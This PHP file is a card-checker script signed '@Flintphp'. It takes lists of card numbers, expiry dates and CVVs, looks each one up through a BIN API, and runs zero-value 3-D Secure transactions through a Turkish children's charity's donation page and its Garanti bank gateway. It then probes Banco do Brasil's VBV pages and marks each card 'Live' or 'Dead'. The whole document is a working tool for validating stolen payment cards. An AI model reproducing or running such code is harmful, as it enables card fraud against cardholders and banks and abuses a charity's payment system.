<?php 
set_time_limit(0);
error_reporting(0);
sleep(5);

function limpacookie()
{
  if (file_exists("cookie.txt")) {
    unlink("cookie.txt");
  }
}

function trazer($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

   /*/####################/*/
###### CODER: @Flintphp #######
  /*/###################/*/

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode($lista)[0];
$mes = multiexplode($lista)[1];
$ano = multiexplode($lista)[2];
$cvv = multiexplode($lista)[3];

$bin = substr($cc, 0,6);
if ($bin[0] == 4) {
  $host = 'www58.bb.com.br';
  $auth = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/auth.bb';
  $inicio = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/inicio.bb';
  $customer = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/customer.bb';
  $refCustomer = 'https://www58.bb.com.br/ThreeDSecureAuth/gcs/statics/gas/validacao.bb?urlRetorno=/ThreeDSecureAuth/vbvLogin/customer.bb';
}else{
  $host = 'www66.bb.com.br';
  $auth = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/auth.bb';
  $inicio = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/inicio.bb';
  $customer = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/customer.bb';
  $refCustomer = 'https://www66.bb.com.br/SecureCodeAuth/gcs/statics/gas/validacao.bb?urlRetorno=/SecureCodeAuth/scdLogin/customer.bb';
}

$dig = strlen($ano);
if ($dig > 2) {
  $ano = substr($ano, 2,4);
}

$file = file_get_contents("https://dragon-bin-api.vercel.app/api/$cc");

$bank = trazer($file, '"bank":"','"');
$scheme = trazer($file, '"vendor":"','"');
$level = trazer($file, '"level":"','"');
$type = trazer($file, '"type":"','"');
$code = trazer($file, '"code":"','"');


$dados = "$bin | $bank - $scheme - $type - $level - $code";



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://koruncuk.org/egitimeelverhayalimgercekolsun/onlinebagis');
curl_setopt($ch, CURLOPT_HEADER, 1);
#curl_setopt($ch, CURLOPT_PROXY, 'socks5://p.webshare.io:80');
#curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: koruncuk.org',
  'Origin: https://koruncuk.org',
  'Content-Type: application/x-www-form-urlencoded',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'Referer: https://koruncuk.org/egitimeelverhayalimgercekolsun/onlinebagis',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'OnlineBagis%5Bsube%5D=&OnlineBagis%5Bsube%5D=merkezkoruncuk&OnlineBagis%5Bamout%5D=djshfsf&OnlineBagis%5Baciklama%5D=&OnlineBagis%5Bfirma%5D=&OnlineBagis%5Bad%5D=samuel&OnlineBagis%5Bsoyad%5D=azevedo&OnlineBagis%5Bfirmatel%5D=5509228283&OnlineBagis%5Bemail%5D=teste565%40gmail.com&OnlineBagis%5Badres%5D=Rua+Jo%C3%A3o+Paulo&OnlineBagis%5Bsehir%5D=0&OnlineBagis%5Bpostakod%5D=04747030&OnlineBagis%5Bkvkk%5D=0&OnlineBagis%5Bkvkk%5D=1');
$a = curl_exec($ch);

$hash = trazer($a, '"secure3dhash" value="','"');
$terminalid = trazer($a, '"terminalid" value="','"');
$orderid = trazer($a, '"orderid" value="','"');
$terminalmerchantid = trazer($a, '"terminalmerchantid" value="','"');
$customeripaddress = trazer($a, '"customeripaddress" value="','"');
$txntimestamp = trazer($a, '"txntimestamp" value="','"');



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sanalposprov.garanti.com.tr/servlet/gt3dengine');
curl_setopt($ch, CURLOPT_HEADER, 1);
#curl_setopt($ch, CURLOPT_PROXY, 'socks5://p.webshare.io:80');
#curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: sanalposprov.garanti.com.tr',
'Origin: https://koruncuk.org',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Referer: https://koruncuk.org/',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'refreshtime=5&secure3dsecuritylevel=3D_OOS_HALF&mode=PROD&apiversion=v0.01&terminalprovuserid=PROVOOS&terminaluserid=koruncukorg&terminalid=10001421&terminalmerchantid=9133760&orderid='.$orderid.'&customeremailaddress=teste565%40gmail.com&customeripaddress='.$customeripaddress.'&txntype=sales&txnamount=0&txncurrencycode=949&companyname=T%C3%9CRK%C4%B0YE+KORUNMAYA+MUHTA%C3%87+%C3%87OCUKLAR+VAKFI&txninstallmentcount=&successurl=https%3A%2F%2Fkoruncuk.org%2Fegitimeelverhayalimgercekolsun%2Fonlinesuccess&errorurl=https%3A%2F%2Fkoruncuk.org%2Fegitimeelverhayalimgercekolsun%2Fonlineerror&secure3dhash='.$hash.'&lang=tr&txntimestamp=1646134496&orderaddresscount=1&orderaddresscity1=ADANA&orderaddresscompany1=&orderaddresscountry1=&orderaddressdistrict1=&orderaddressfaxnumber1=&orderaddressgsmnumber1=&orderaddresslastname1=azevedo&orderaddressname1=samuel&orderaddressphonenumber1=5509228283&orderaddresspostalcode1=04747030&orderaddresstext1=Rua+Jo%C3%A3o+Paulo.&orderaddresstype1=S&ordercommentcount=1&ordercommentnumber1=1&ordercommenttext1=');
$b = curl_exec($ch);

$secure3DRecordKey = trazer($b, '"secure3DRecordKey" value="','"');



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sanalposprov.garanti.com.tr/servlet/gt3dengine');
curl_setopt($ch, CURLOPT_HEADER, 1);
#curl_setopt($ch, CURLOPT_PROXY, 'socks5://p.webshare.io:80');
#curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: sanalposprov.garanti.com.tr',
'Origin: https://sanalposprov.garanti.com.tr',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Referer: https://sanalposprov.garanti.com.tr/servlet/gt3dengine',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'cardholder=samuel+silva&cardnumber='.$cc.'&cardexpiredatemonth='.$mes.'&cardexpiredateyear='.$ano.'&cardcvv2=0000&secure3DRecordKey='.$secure3DRecordKey.'&terminalid=10001421&lang=tr&oosStatus=&uniqueId=N0NCMTY0QTk1QjIwNEQxQThG&atalanteResults=IsOFwoBBPsK3wpNSKsKUwohZPsKzwohaPMOFw5sGaMOWw40VKcKVwoREKsKkwo5CN8KTw4MNa8OVw40VNMKGwplnK8KCwpJEe8Odw5MBbMOLw4NaMMKJwrFFPMKUwpIVY8OUw5cbe8KGwpdQFMKIwpREPMK0wpFSPMKDw4MNaMORw40VLcKOwoxSCsKXwoRZLcKowo9nOMKAwoQVY8OFw5MEd8OWw5cVdcOFwpRZMMKWwpRSEMKDw4MNe8Kpw5F5GsKqwrVuacK2wrVcaMK2wot%2BLsKpwqRmIcK2wrVfHsOFw40VLcKewpFeN8KAwrJHPMKCwoV5OMKKwoQVY8OFw5ABd8OUw5EVdcOFwpVOKcKOwo9QCsKXwoRSPcKkwoBFPcKpwpRaO8KCwpMVY8OFw5APd8OUw5MVdcOFwpVOKcKOwo9QDcKOwoxSF8KGwoxSe8Odw4MDd8OXw5QVdcOFwpVOKcKOwo9QDcKOwoxSGsKGwpNTF8KSwoxVPMKVw4MNe8OXw48Bb8OFw40VOMKRwoZ2OsKEwoRbPMKVwoBDMMKIwo8VY8KJwpRbNcOLw4NWL8KAwrVYLMKEwoljMMKKwoQVY8KJwpRbNcOLw4NDNsKSwoJfGsKIwpRZLcOFw5sHdcOFwoxeN8Kzwo5COsKPw4MNN8KSwo1bdcOFwoxWIcKzwo5COsKPw4MNN8KSwo1bdcOFwoBBPsKkwo1eOsKMwrVeNMKCw4MNYcOUw40VOsKLwohUMsKkwo5CN8KTw4MNb8OLw4NaMMKJwqJbMMKEwooVY8ORw5kbe8KKwoBPGsKLwohUMsOFw5sGacOew40VNMKIwpREPMKrwo5UOMKTwohYN8KUw4MNAsK6w40VPcKCwpdeOsKCwq5FMMKCwo9DOMKTwohYN8K%2Bw4MNe8OKw4Mbe8KDwoRBMMKEwoR4K8KOwoRZLcKGwpVeNsKJwrsVY8OFw4wVJA%3D%3D');
$c = curl_exec($ch);

$p = urlencode(trazer($c, '"PaReq" value="','"'));
$m = urlencode(trazer($c, '"MD" value="','"'));
$t = urlencode(trazer($c, '"TermUrl" value="','"'));




$url = $inicio;

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: $host",
   "Cache-Control: max-age=0",
   "Origin: https://www58.bb.com.br",
   "Upgrade-Insecure-Requests: 1",
   "DNT: 1",
   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36",
   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
   "Sec-Fetch-Site: same-origin",
   "Sec-Fetch-Mode: navigate",
   "Sec-Fetch-Dest: document",
   "Referer: $auth",
   "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
   "Content-Type: application/x-www-form-urlencoded",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "TermUrl=$t&PaReq=$p&MD=$m";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp2 = curl_exec($curl);


if (strpos($resp2, '
Abra o aplicativo do BB em seu smartphone')) {
  exit("<br><span class='text-success'>[#Live] ➜ </span>
<span class='text-info'>$lista ➜ </span>
<span class='text-warning'>$dados ➜ </span>
<span class='text-success'>VBV-QRCODE ➜ </span>
<span class='text-info'>@Flintphp</span><br>");
}elseif (strpos($resp2, 'Ocorreu um erro durante o processamento de sua autentica')) {
   exit("<br><span class='text-danger'>[#Dead] ➜ </span>
<span class='text-info'>$lista ➜ </span>
<span class='text-warning'>$dados ➜ </span>
<span class='text-success'>Declined ➜ </span>
<span class='text-info'>@Flintphp</span><br>");
}



$url = $customer;

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: $host",
   "Upgrade-Insecure-Requests: 1",
   "DNT: 1",
   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36",
   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
   "Sec-Fetch-Site: same-origin",
   "Sec-Fetch-Mode: navigate",
   "Sec-Fetch-Dest: document",
   "Referer: $refCustomer",
   "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp3 = curl_exec($curl);


if (strpos($resp3, 'Selecione um celular para receber o código de confirmação')) {
  exit("<br><span class='text-success'>[#Live] ➜ </span>
<span class='text-info'>$lista ➜ </span>
<span class='text-warning'>$dados ➜ </span>
<span class='text-success'>VBV-SMS ➜ </span>
<span class='text-info'>@Flintphp</span><br>");
}elseif (strpos($resp3, 'Prezado cliente')) {
  exit("<br><span class='text-success'>[#Live] ➜ </span>
<span class='text-info'>$lista ➜ </span>
<span class='text-warning'>$dados ➜ </span>
<span class='text-success'>SEM-VBV ➜ </span>
<span class='text-info'>@Flintphp</span><br>");
}else{
   exit("<br><span class='text-danger'>[#Dead] ➜ </span>
<span class='text-info'>$lista ➜ </span>
<span class='text-warning'>$dados ➜ </span>
<span class='text-success'>Declined ➜ </span>
<span class='text-info'>@Flintphp</span><br>");
}
